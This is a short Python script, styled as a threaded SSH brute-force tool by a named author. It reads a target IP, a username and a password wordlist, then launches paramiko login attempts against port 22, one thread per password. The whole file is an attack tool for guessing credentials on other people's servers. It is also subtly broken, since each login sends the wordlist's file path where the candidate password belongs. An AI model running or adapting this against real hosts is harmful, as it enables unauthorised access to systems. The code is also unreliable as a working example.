import paramiko, sys, os, socket
import threading, time

print("$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$")
print("$    BRUTEFORCER CREATED BY     $")
print("$          SOORAJ               $")
print("$         VERSION 1.0           $")
print("$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$")

host = input("[*] Enter the target ip : ")
username = input("[*] Enter the username: ")
password_file = input("[*] Enter the password file : ")
print("\n")

StopFlag = 0


def ssh_connect(password):
    global StopFlag
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(host, port=22, username=username, password=password_file)
        StopFlag = 1
        print("[+] Found password", password, ", For account", username)
    except:
        print("[-] Incorrect password")
    ssh.close()


if not os.path.exists(password_file):
    print("[!] File/Path doesn't exist")
    sys.exit(1)

print("STARTING THREADED BRUTEFORCE==> "+ host + "with account: " + username)

with open(password_file, 'r') as file:
    for line in file.readlines():
        if StopFlag == 1:
            t.join()
            exit()
        password = line.strip()
        t = threading.Thread(target=ssh_connect, args=(password,))
        t.start()
        time.sleep(0.5)

